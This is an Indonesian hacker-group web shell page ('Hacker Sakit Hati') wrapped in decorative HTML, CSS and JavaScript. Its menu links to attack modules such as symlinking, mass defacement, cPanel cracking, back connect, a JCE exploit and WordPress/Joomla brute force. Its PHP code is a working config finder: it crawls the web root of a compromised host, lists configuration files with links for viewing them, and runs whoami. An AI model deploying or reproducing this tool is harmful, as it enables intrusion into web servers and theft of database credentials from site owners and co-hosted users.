<font class="hk2" style="text-shadow: 1px -1px 8px;">
<html>
<head>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<font class="hk2" style="text-shadow: 1px -1px 8px;"> 
<!--by hacker sakit hati-->  
<head>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style>
</head>

<style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><script language="JavaScript">function tb5_makeArray(n){ this.length = n; return this.length;



}



tb5_messages = new tb5_makeArray(2);



tb5_messages[0] = "Hacker Sakit Hati";



tb5_messages[1] = "Hacker Sakit Hati";



tb5_rptType = 'infinite';



tb5_rptNbr = 100;



tb5_speed = 200;



tb5_delay = 50;



var tb5_counter=1;



var tb5_currMsg=0;



var tb5_stsmsg="";



function tb5_shuffle(arr){



var k;



for (i=0; i<arr.length; i++){ k = Math.round(Math.random() * (arr.length - i - 1)) + i; temp = arr[i];arr[i]=arr[k];arr[k]=temp;



}



return arr;



}



tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);



for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_";



}



tb5_arr = tb5_shuffle(tb5_arr);



function tb5_init(n){



var k;



if (n == tb5_arr.length){ if (tb5_currMsg == tb5_messages.length-1){ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){ clearTimeout(tb5_timerID); return; } tb5_counter++; tb5_currMsg=0; } else{ tb5_currMsg++; } n=0; tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length); tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length); for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){ tb5_arr[i] = i; tb5_sts[i] = "_"; } tb5_arr = tb5_shuffle(tb5_arr); tb5_sp=tb5_delay;



}



else{ tb5_sp=tb5_speed; k = tb5_arr[n]; tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k); tb5_stsmsg = ""; for (var i=0; i<tb5_sts.length; i++) tb5_stsmsg += tb5_sts[i]; document.title = tb5_stsmsg; n++; } tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);



}



function tb5_randomizetitle(){ tb5_init(0);



}



tb5_randomizetitle();</script><script>/*



An object-oriented Typing Text script, to allow for multiple instances.



A script that causes any text inside any text element to be "typed out", one letter at a



time. Note that any HTML tags will not be included in the typed output, to prevent them



from causing problems. Tested in Firefox v1.5.0.1, Opera v8.52, Konqueror v3.5.1, and IE



v6.



Browsers that do not support this script will simply see the text fully displayed from the



start, including any HTML tags.



Functions defined: TypingText(element, [interval = 100,] [cursor = "",] [finishedCallback = function()



{return}]): Create a new TypingText object around the given element. Optionally specify a delay between characters of interval milliseconds. cursor allows users to specify some HTML to be appended to the end of the string whilst typing. Optionally, can also be a function which accepts the current text as an argument. This allows the user to create a "dynamic cursor" which changes depending on the latest character or the current length of the string. finishedCallback allows advanced scripters to supply a function to be executed on finishing. The function must accept no arguments. TypingText.run(): Run the effect. static TypingText.runAll(): Run all TypingText-enabled objects on the page.



*/



TypingText = function(element, interval, cursor, finishedCallback) { if((typeof document.getElementById == "undefined") || (typeof element.innerHTML ==



"undefined")) { this.running = true; // Never run. return; } this.element = element; this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; }); this.interval = (typeof interval == "undefined" ? 100 : interval); this.origText = this.element.innerHTML; this.unparsedOrigText = this.origText; this.cursor = (cursor ? cursor : ""); this.currentText = ""; this.currentChar = 0; this.element.typingText = this; if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++; TypingText.all.push(this); this.running = false; this.inTag = false; this.tagBuffer = ""; this.inHTMLEntity = false; this.HTMLEntityBuffer = "";



}



TypingText.all = new Array();



TypingText.currentIndex = 0;



TypingText.runAll = function() { for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();



}



TypingText.prototype.run = function() { if(this.running) return; if(typeof this.origText == "undefined") { setTimeout("document.getElementById('" + this.element.id + "').typingText.run()",



this.interval); // We haven't finished loading yet. Have patience. return; } if(this.currentText == "") this.element.innerHTML = "";



// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text. if(this.currentChar < this.origText.length) { if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) { this.tagBuffer = "<"; this.inTag = true; this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) { this.tagBuffer += ">"; this.inTag = false; this.currentText += this.tagBuffer; this.currentChar++; this.run(); return; } else if(this.inTag) { this.tagBuffer += this.origText.charAt(this.currentChar); this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) { this.HTMLEntityBuffer = "&"; this.inHTMLEntity = true; this.currentChar++; this.run(); return; } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) { this.HTMLEntityBuffer += ";"; this.inHTMLEntity = false; this.currentText += this.HTMLEntityBuffer; this.currentChar++; this.run(); return; } else if(this.inHTMLEntity) { this.HTMLEntityBuffer += this.origText.charAt(this.currentChar); this.currentChar++; this.run(); return; } else { this.currentText += this.origText.charAt(this.currentChar); } this.element.innerHTML = this.currentText; this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof



this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : ""); this.currentChar++; setTimeout("document.getElementById('" + this.element.id + "').typingText.run()",



this.interval); } else { this.currentText = ""; this.currentChar = 0; this.running = false; this.finishedCallback(); }



}</script><center>
<!--by hacker sakit hati-->

</head>

<body>
<style type="text/css">     
  body { 
     
     
    
     
    background: black url("http://2.bp.blogspot.com/-Gc5k--PvR5s/Ue3pzaZxNmI/AAAAAAAABKA/SRaz-fAXYv0/s200/0_1_1.gif");
     
     
     
     
    background-repeat: repeat;
     
    
     
     
    background-position: center;
     
     
     
     
    background-attachment: fixed;
     
     
    }
     
     
     
     
    </style>
	<style>*{ font-family:tahoma; font-size:12; }

input, textarea,select {

    border: 1px solid #626262;

}

</style>
    <link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
<center><table style="background:#" border="1">
<!--by hacker sakit hati-->   
<font class="hk2" style="text-shadow: 1px -1px 8px;">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
    /*NoScript*/
    #enjs {z-index: 999;position:fixed;top:0;left:0;width:100%;height:100%;background-color:#000;margin:0;padding:0;}
    #enjs p {margin:0;padding:0;width:100%;color:#333;position:relative;top:40%;font:bold 18px/20px arial;text-align:center;text-shadow:none;}
    /*ScrollBar */
    ::-webkit-scrollbar {width: 12px;}
    ::-webkit-scrollbar-track {background:rgb(71, 71, 71);}
    ::-webkit-scrollbar-thumb, ::-webkit-scrollbar-thumb:window-inactive { background: rgb(34, 34, 34); }
    #loading-overlay {position:fixed;top:0;left:0;right:0;bottom:0;background:#000000;z-index:999999;text-align:center;width:100%;height:100%;padding-top:22%;color:Darkviolet;}
    .ball {background-color: transparent;border:5px solid rgb(240 ,0 , 0);border-right:5px solid transparent;border-left:5px solid transparent;border-radius:50px;box-shadow: 0 0 35px rgb(255 ,0 , 0);width:50px;height:50px;margin:0 auto;-moz-animation:spinPulse 1s infinite ease-in-out;-webkit-animation:spinPulse 1s infinite linear;}
    .ball1 {background-color: transparent;border:5px solid rgb(240 ,0 , 0);border-left:5px solid transparent;border-right:5px solid transparent;border-radius:50px;box-shadow: 0 0 15px rgb(255 ,0 , 0);width:30px;height:30px;margin:0 auto;position:relative;top:-50px;-moz-animation:spinoffPulse 1s infinite linear;-webkit-animation:spinoffPulse 1s infinite linear;}
    @-moz-keyframes spinPulse {0% { -moz-transform:rotate(160deg); opacity:0; box-shadow:0 0 1px rgb(255, 0, 0)}50% { -moz-transform:rotate(145deg); opacity:1; }100% { -moz-transform:rotate(-320deg); opacity:0; }}
    @-moz-keyframes spinoffPulse {0% { -moz-transform:rotate(0deg); } 100% { -moz-transform:rotate(360deg); }}
    @-webkit-keyframes spinPulse {0% { -webkit-transform:rotate(160deg); opacity:0; box-shadow:0 0 1px rgb(255, 0, 0)} 50% { -webkit-transform:rotate(145deg); opacity:1;} 100% { -webkit-transform:rotate(-320deg); opacity:0; }}
    @-webkit-keyframes spinoffPulse {0% { -webkit-transform:rotate(0deg); } 100% { -webkit-transform:rotate(360deg); }}
    </style>
    </head>
<!--by hacker sakit hati--> <center>     
<br>
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;"><div class="cont"><br> 

<div class="cont"><br> 

] [ <a href="?"> Home </a>]

[<a href="sempak.php"> Symlink </a>]

[<a href="katok.php"> MSQL </a>]

[ <a href="slorokan.php"> Config Massdeface </a>]

[<a href="helm.php"> Crack Cpanel </a>]

[ <a href="sabun.php"> Sabuner </a>] [

<br /><br />

] [ <a href="cf.php"> Config Finder </a>]

[<a href="wvc.php"> Weevely Conect </a>]

[<a href="bc.php"> Back Connect </a>]

[ <a href="sc.php"> Shell Scanner  </a>] 

[ <a href="nginceng.php"> Ngintip Janda </a>]

[ <a href="bh.php"> Zone H </a>]  [

<br /><br />

] [ <a href="jembut.php"> Scanner WP & JM Plugin </a>]

[ <a href="kringet.php"> Scanner JM Come User  </a>]

[ <a href="jomblo.php">JCE Remot Jomblo  </a>]

[ <a href="ngocok.php"> WP & JM Brute Force </a>]


[ <a href="info.php"> Contact Me  </a>] [

<br /></div><br />

<hr><td style="text-align: right; vertical-align: top; color: # ; padding-right: 3pt; border-right: 1px solid # ">
<!--by hacker sakit hati--> 
<center>
<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
<?php
//Hacker Sakit Hati
error_reporting(0);
#chdir('');
//Some basic var's
if (!@$_GET['path']) {
    $dir = CleanDir(getcwd());
} else {
    $dir = CleanDir($_GET['path']);
}
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$domain = $_SERVER['HTTP_HOST'];
$script = $_SERVER['SCRIPT_NAME'];
$full_url = $_SERVER['REQUEST_URI'];
$script2 = basename($script);
$serverip = $_SERVER['SERVER_ADDR'];
$userip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
$disabled = ini_get('disable_functions');
//Some functions
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];

    if ($for == "configs_found") {
        $message = "$var1 Configs Found!";
        $redirect = "";
    }
	
    if (empty($redirect)) {
        echo "<script>
function remove (){
 document.getElementById('xbox').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
    } else {
        echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
function error($mesg) {
    $error = "<center><font size='4' color='red'><b>$mesg</b></font></center>";
    echo "$error";
}

//Mass File Function
function files($mass_dir) {
    if ($dh = opendir($mass_dir)) {
        $files = array();
        $inner_files = array();
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.') {
                if (is_dir($mass_dir . "/" . $file)) {
                    $inner_files = files("$mass_dir/$file");
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, "$mass_dir/$file");
                }
            }
        }
        closedir($dh);
        return $files;
    }
}

//Navbar will go here.
//Basic for now
echo "<center><font size='4' color='white'><b>
[ <a href='http://$domain$script?config' class='navbar'>Config Finder</a> ] 
</b></font></center>";
//End navbar
//Anything you want echo'd out between misc system bar
//and misc file bar put below here!
//Config finder
if (isset($_GET['config'])) {
    $configs_found = 0;
    foreach (files($rootdir) as $key => $cfile) {
        $file2 = trim($cfile, ".");
        $cex = explode("/", $file2);
        $cex2 = end($cex);
        if (preg_match('/config/', $cex2)) {
            echo "<a class='navbar' href='mini.php$script?action=view&file=$file2'>$file2</a><br>";
            $configs_found++;
        }
    }
    if ($configs_found == "0") {
        error("No configuration files found!");
    } else {
        echo "<font color='lime'>$configs_found Configuration files found!</font><br><br>";
        success("configs_found", $configs_found);
    }
}

echo "</form></div>";
closedir();
?> 	<center>
<script language="JavaScript1.2">
var message="  Copyright © 2014 By Hacker Sakit Hati   "// jangan pakai enter
var neonbasecolor=" aqua "
var neontextcolor=" white "
var neontextcolor2="pink"  // kode warna kedua
var flashspeed=1	// kecepatan flash neon, semakin kecil semakin cepat
var flashingletters=10	// jumlah huruf yang tersorot oleh flash
var flashingletters2=2	// jumlah warna di ekor flash
var flashpause=1					
///edit by http://googel-indonesia.blogspot.com/
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script> 
    <div id="loading-overlay">
    <div class="ball"></div>
    <div class="ball1"></div>
    <h3>Tunggu Sebentar,.... Masih Proses Loading..............</h3>
    </div>
    <script>
    // hilangkan overlay dengan efek .fadeOut() jika keseluruhan halaman telah selesai dimuat
    $(window).bind("load", function() {
    $("#loading-overlay").fadeOut();
    });
    </script>
</script>  	
</center></body></html>
